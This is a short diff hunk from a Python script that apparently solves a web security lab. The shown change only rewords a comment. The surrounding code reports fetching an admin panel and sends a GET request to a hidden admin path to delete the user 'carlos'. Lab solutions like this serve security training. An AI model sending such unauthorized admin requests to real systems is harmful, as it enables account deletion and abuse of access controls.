@@ -56,7 +56,7 @@ except:
 print(Fore.WHITE + "3. Fetching the admin panel.. " + Fore.GREEN + "OK")
 
 try:  
-    # delete the carlos
+    # delete carlos
     delete_carlos = requests.get(f"{url}{hidden_path}/delete?username=carlos")
     
 except:
